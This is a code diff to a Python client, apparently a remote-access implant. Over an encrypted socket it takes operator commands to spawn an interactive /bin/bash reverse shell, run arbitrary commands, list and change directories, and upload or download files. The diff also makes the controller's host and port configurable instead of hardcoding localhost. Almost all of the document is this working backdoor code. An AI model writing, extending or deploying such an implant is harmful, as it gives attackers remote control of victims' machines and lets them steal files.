@@ -13,8 +13,8 @@ import os
 logging.basicConfig(level=None)
 
 # Constants
-SENDING_FILE = b"sendingfile"
-GETTING_FILE = b"gettingfile"
+SEND_FILE_CMD = "put_file"
+GET_FILE_CMD = "get_file"
 
 def stat_to_dict(stat_obj):
     return {
@@ -102,13 +102,20 @@ class NetManager:
 
     def receive_file(self, filename):
         """Receives a file from the socket and writes it to the local system."""
+        self.send_msg("ready".encode())
+        
+        try:
+            msg = self.recv_msg()
+        except ConnectionResetError:
+            return
+
         with open(filename, "wb") as f:
-            self.send_response(f.read())
+            f.write(msg)
 
     def send_file(self, filename):
         """Reads a file from the local system and sends it through the socket."""
         with open(filename, "rb") as f:
-            self.send_response(f.read())
+            self.send_msg(f.read())
 
     def change_directory(self, cmd, folder):
         try:
@@ -117,14 +124,14 @@ class NetManager:
         except FileNotFoundError:
             stdout_value = f"error: {folder} not found".encode()
         finally:
-            self.send_response(stdout_value)
+            self.send_msg(stdout_value)
 
-    def handle_file_transfers(self, data):
-        """Handles file transfers based on the received data."""
+    def handle_commands(self, data):
+        """Add description"""
         params = data.decode().split(" ")
         if params[0] == "shell":
             stdout_value = NO_OUTPUT_SIGNAL.encode()
-            self.send_response(stdout_value)
+            self.send_msg(stdout_value)
             # Save the old file descriptors
             old_stdin = os.dup(0)
             old_stdout = os.dup(1)
@@ -136,34 +143,35 @@ class NetManager:
             os.dup2(file_descriptor, 2)  # Standard Error
 
             # Spawn a new shell process
-            pty.spawn("/bin/bash")
+            pty.spawn("/bin/bash") # Does not exit for some reason
             # After the pty.spawn is done, restore the old file descriptors
             self.socket.sendall(b"PotatoeMunchkinExit132@@")
+            self.socket.recv(1)
             os.dup2(old_stdin, 0)
             os.dup2(old_stdout, 1)
             os.dup2(old_stderr, 2)
             return True
         elif params[0] == "ls":
             if len(params) == 2:
-                self.send_response(scandir_to_dict(params[1]))
+                self.send_msg(scandir_to_dict(params[1]))
             elif len(params) == 1:
-                self.send_response(scandir_to_dict())
+                self.send_msg(scandir_to_dict())
             return True
         elif data.decode().split(" ")[0] == "cd":
             cmd = data.decode().split(" ")[0]
             folder = data.decode().split(" ")[1]
             self.change_directory(cmd, folder)
             return True
-        elif SENDING_FILE in data:
-            file = data.decode().split("sendingfile ")[1].strip()
+        elif params[0] == SEND_FILE_CMD:
+            file = params[1].strip()
             self.receive_file(file)
             return True
-        elif GETTING_FILE in data:
-            file = data.decode().split("gettingfile ")[1].strip()
+        elif params[0] == GET_FILE_CMD:
+            file = params[1].strip()
             self.send_file(file)
             return True
-        elif params[0] == "aliv":
-            self.send_response(b"is_alive")
+        elif params[0] == "cmd":
+            self.send_msg(self.execute_command(data[4:]))
             return True
         return False
 
@@ -172,7 +180,7 @@ class NetManager:
         stdout_value, stderr_value = self.shell.execute_command(data.decode("utf-8"))
         return f"{stdout_value.decode()}{stderr_value.decode()}".encode()
 
-    def send_response(self, data):
+    def send_msg(self, data):
         if len(data) > 0:
             message_length, message = self.crypto.encrypt_message(data, self.crypto.derived_key)
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
@@ -182,25 +190,41 @@ class NetManager:
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
             self.socket.sendall(message)
 
+    def recv_msg(self):
+        chunk = b""
+        self.crypto.derived_key = self.crypto.get_derived_key(self.crypto.parameters, self.socket)
+        data_length_bytes = self.socket.recv(4)
+        data_length = int.from_bytes(data_length_bytes, byteorder="big")
+        data_bytes = bytearray()
+        while len(data_bytes) < data_length:
+            chunk = self.socket.recv(data_length - len(data_bytes))
+            if chunk == b"":
+                raise RuntimeError("socket connection broken")
+            data_bytes.extend(chunk)
+
+        return self.crypto.decrypt_message(bytes(data_bytes), self.crypto.derived_key)
+
+
     def netloop(self):
         self.crypto.parameters = self.crypto.get_params(self.socket)
 
         while True:
             try:
-                self.crypto.derived_key = self.crypto.get_derived_key(self.crypto.parameters, self.socket)
+                msg = self.recv_msg()
             except ConnectionResetError:
                 break
-            data = self.socket.recv(1024)
-            if not data:
+        
+            if not msg:
                 break
-            message = self.crypto.decrypt_message(data, self.crypto.derived_key)
-            if self.handle_file_transfers(message):
-                continue
+        
             try:
-                self.send_response(self.execute_command(message))
+                self.handle_commands(msg)
             except BrokenPipeError:
                 logging.error("Connection closed by the host.")
                 break
+            except Exception as e:
+                self.send_msg(str(e).encode())
+
 
 def main():
     """Main function to parse arguments and start execution."""
@@ -212,7 +236,8 @@ def main():
     if args.test:
         print("Hello world! Wasd")
         return
-    net_manager = NetManager("localhost", 4242)
+    
+    net_manager = NetManager(args.host, args.port)
     net_manager.netloop()
 
 
